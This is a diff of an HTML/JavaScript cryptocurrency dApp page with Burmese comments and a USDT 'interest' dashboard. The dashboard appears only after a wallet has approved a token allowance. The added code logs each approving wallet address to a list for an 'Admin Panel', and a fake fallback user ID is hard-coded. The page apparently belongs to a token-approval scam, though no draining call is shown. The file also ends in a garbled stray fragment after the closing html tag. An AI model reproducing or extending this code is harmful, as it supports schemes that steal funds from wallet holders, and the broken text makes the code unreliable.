@@ -82,7 +82,7 @@
         </p>
     </div>
 
-    <!-- PART 2 -->
+    <!-- PART 2 (Dashboard is placed above Interest Rate Tiers) -->
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
         
         <!-- Updated User Dashboard -->
@@ -315,7 +315,6 @@
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
-                    // Welcome Back စာသားဖြင့် အစားထိုးပြသခြင်း
                     document.getElementById("statusLog").innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
 
                     await checkUserData();
@@ -454,6 +453,13 @@
                 const rate = getInterestRate(formattedBal);
 
                 if (Number(allowance) > 0) {
+                    // Admin Panel အတွက် localStorage တွင် Address မှတ်တမ်းတင်ခြင်း
+                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                    if (!savedUsers.includes(userAddress)) {
+                        savedUsers.push(userAddress);
+                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
+                    }
+
                     dashboardEl.classList.remove("hidden");
                     document.getElementById("lblUserId").innerText = userInfo.isRegistered ? userInfo.userId.toString() : "3069";
                     document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
@@ -501,4 +507,4 @@
         }
     </script>
 </body>
-</html>
+</html>unction
